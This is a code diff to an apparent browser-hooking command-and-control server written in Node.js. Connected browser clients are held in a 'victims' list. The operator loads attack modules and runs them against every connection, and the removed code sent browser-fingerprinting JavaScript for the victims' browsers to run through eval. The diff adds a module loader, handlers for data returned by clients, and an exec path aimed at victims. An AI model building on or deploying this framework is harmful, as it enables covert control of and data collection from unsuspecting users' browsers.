@@ -12,6 +12,10 @@ var http = require('http')
 var conns = []
 var gr;
 var module;
+var handlers=[];
+var options;
+var precursor = ">>>";
+var loaded_module="";
 var server = http.createServer((request, response) => {
 
   //output((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')
@@ -58,7 +62,7 @@ var server = http.createServer((request, response) => {
   }
 })
 server.listen(webSocketsServerPort, () => {
-  output((new Date()) + " Server is listening on port " + webSocketsServerPort )
+  console.log((new Date()) + " Server is listening on port " + webSocketsServerPort )
   start_interface();
 })
 
@@ -69,11 +73,17 @@ wsServer = new WebSocketServer({
 function handleresponse(obj, con)
 {
 	//HERE WHAT TO DO WITH RESPONSES FROM CLIENTS
-	if ("fingerprint" in obj) {
-		output("fingerprint: "+obj.fingerprint);
-		con.fingerprint=obj.fingerprint;
-	} else if ("data" in obj) {
-		output(obj);
+	//if ("fingerprint" in obj) {
+	//	output("fingerprint: "+obj.fingerprint);
+	//	con.fingerprint=obj.fingerprint;
+	//} else if ("data" in obj) {
+	if ("data" in obj) {
+		console.log("");
+		console.log(obj);
+	}
+	//sending to all handlers
+	for (i in handlers) {
+		handlers[i].handler(options, con, obj);
 	}
 	// TODO use for merging with connections for info // if ("components" in obj) {
 	//TODO 
@@ -120,45 +130,34 @@ function handleReq(obj, con)
     gr = obj.html
 }
 
-function ask_fingerprint_info(connection)
-{
-	command = "new Fingerprint2().get(function(result, components){ socket.send(JSON.stringify({'fingerprint':result})); socket.send(JSON.stringify({'components':components})); });"
-	connection.sendUTF(JSON.stringify({ request: 'eval', content: UglifyJS.minify(command,{ie8:true})}))  
-}
-
 //REQUESTS
 wsServer.on('request', (request) => {
   var obj
-  var connection = request.accept(null, request.origin)
-  conns.push(connection)
+  var connection = request.accept(null, request.origin);
+  connection.name = connection.remoteAddress
+  conns.push(connection);
 
   connection.on('request', (message) => {
-    output('request: ' + message)
+    console.log('request: ' + message)
   })
 
   connection.on('message', (message) => {
     try { obj = JSON.parse(message.utf8Data) } catch(e) {}
-    if (typeof(obj) === 'object')
-	  {
-		handleReq(obj, connection);
-		handleresponse(obj,connection);
-
-	  }
-    else
-	  {
-		//TODO give name of connection (with using the connection var to the left
-		output('message: ' + message.utf8Data);
-	  }
+    if (typeof(obj) === 'object') {
+	handleReq(obj, connection);
+	handleresponse(obj,connection); 
+    } else {console.log('message: ' + message.utf8Data); }
   })
   // remove connection from our list
   connection.on('close', connection => {
-    output('connection closed')
+    console.log("");
+    console.log('connection closed')
     for (var i in conns)
       if (conns[i] == connection)
         conns.splice(i, 1)
   })
 
-  ask_fingerprint_info(connection);
+  //ask_fingerprint_info(connection);
 })
 
 //INTERFACE
@@ -171,7 +170,7 @@ function input() {
 	//TODO check if already active
 	//prompt.stop();
 	prompt.start();
-	prompt.get({properties: {command:{description: ">>>"}}}, function (err, result) {
+	prompt.get({properties: {command:{description: precursor+loaded_module}}}, function (err, result) {
 		if (result != null) {
 			process_command(result.command);
 			input();
@@ -204,8 +203,13 @@ function process_command(command) {
 	first_argument=command.split(" ")[0];
 	if (first_argument == "") {
 	} else if (first_argument == "conns") {
-		for (i in conns) {
-			console.log(conns[i].fingerprint);
+		if (conns.length > 0) {
+			console.log ("List of connections:")
+			for (i in conns) {
+				console.log(' ['+i+'] '+conns[i].name);
+			}
+		} else {
+			console.log('No connections...');
 		}
 	} else if (first_argument== "set") { 
 		if (command.split(" ").length > 1) {
@@ -225,27 +229,49 @@ function process_command(command) {
 	} else if (first_argument== "log") { 
 		//on or off get data info
 	} else if (first_argument== "load") { 
-		//TODO detect tab for completion
 		if (command.split(" ").length > 1) {
-			module = require(__dirname+'/'+command.split(" ")[1]);
+			if (fs.existsSync(__dirname+'/modules/'+command.split(" ")[1])) {
+				module = require(__dirname+'/modules/'+command.split(" ")[1]);
+				loaded_module = ' '+command.split(" ")[1]+':';
+				//setup handler
+				handlers.push({name:command.split(" ")[1],handler:module.data.handler})
+			} else {
+				console.log('[ERROR] no such module');
+				modules(command.split(" ")[1]);
+			}
 		} else {
 			console.log("Not enough arguments")
 		}
 	} else if (first_argument== "unload") { 
-		unload();
+		module = null;
+		/*
+		for (var i = handlers.length - 1; i >= 0; --i) {
+			    if (handlers[i].name == loaded_module.substr(1).slice(0, -1)) {
+				            handlers.splice(i,1);
+				        }
+		}
+		*/
+		loaded_module = "";
+	} else if (first_argument== "modules") { 
+		modules();
 	} else if (first_argument== "exec") { 
+		if (module.data) {
 		if (typeof module.data.exec === "function") { 
 			//TODO VICTIMS -> naar victims (list
 			victims = conns;
 			if (command.split(" ").length > 1) {
-				module.data.exec(victims, command.split(" ")[1]);
+				module.data.exec(options ,victims, command.split(" ")[1]);
 			} else {
-				module.data.exec(victims);
+				module.data.exec(options, victims);
 			}
 		} else {
 			console.log('No exec function present in current module')
 		}
+		} else {
+			console.log('no module loaded');
+		}
 	} else if (first_argument== "info") { 
+		if (module.data) {
 		if (typeof module.data.info === "function") { 
 			if (command.split(" ").length > 2) {
 				module.data.info(command.split(" ")[1]);
@@ -254,6 +280,9 @@ function process_command(command) {
 			}
 		} else {
 			console.log('No info function present in current module')
+		}
+		} else {
+			console.log('no module loaded');
 		}
 	} else if (first_argument== "custom") { 
 		if (TARGETS == "all") {
@@ -273,7 +302,19 @@ function process_command(command) {
 }
 
 //UNLOAD current module
-function unload() {
+function modules(searchterm) {
+	if (searchterm) {
+		console.log ("List of modules containing '"+searchterm+ "':");
+	} else {
+		console.log ("List of modules:")
+	}
+	fs.readdirSync(__dirname + '/modules/').forEach(file => {
+		if (!searchterm || file.indexOf(searchterm) !== -1) {
+			if (file.charAt(0) !== '.') {
+		  		console.log('  - '+file);
+			}
+		}
+	})
 }
 //LIST OF SET OPTIONS
 function options() {
